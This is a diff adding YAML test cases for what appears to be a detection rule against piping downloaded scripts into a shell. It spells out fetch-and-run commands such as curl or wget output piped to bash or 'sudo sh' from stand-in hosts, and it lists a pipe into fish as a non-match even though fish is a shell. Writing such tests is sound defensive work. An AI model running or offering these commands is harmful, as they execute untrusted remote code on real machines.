@@ -1,0 +1,30 @@
+match:
+  - description: curl piped to bash
+    event:
+      event: {category: [process], type: [start]}
+      process: {name: bash, command_line: "bash -c curl -fsSL http://203.0.113.7/x.sh | bash"}
+  - description: wget piped to sudo sh with no spaces around the pipe
+    event:
+      event: {category: [process], type: [start]}
+      process: {name: sh, command_line: "sh -c wget -qO- http://203.0.113.7/i|sudo sh"}
+  - description: Absolute interpreter path
+    event:
+      event: {category: [process], type: [start]}
+      process: {name: sh, command_line: "sh -c curl -s https://example.org/a | /bin/bash -s -- --quiet"}
+no_match:
+  - description: Download saved to a file
+    event:
+      event: {category: [process], type: [start]}
+      process: {name: curl, command_line: "curl -o /tmp/x.sh https://example.org/x.sh"}
+  - description: curl piped to a non-shell
+    event:
+      event: {category: [process], type: [start]}
+      process: {name: bash, command_line: "bash -c curl -s https://api.example.org | jq .version"}
+  - description: Pipe into a command whose name merely ends in sh
+    event:
+      event: {category: [process], type: [start]}
+      process: {name: bash, command_line: "bash -c curl -s https://example.org | sshpass -e ssh host"}
+  - description: Pipe into fish, whose name only ends in sh
+    event:
+      event: {category: [process], type: [start]}
+      process: {name: bash, command_line: "bash -c curl -s https://example.org/x | fish"}
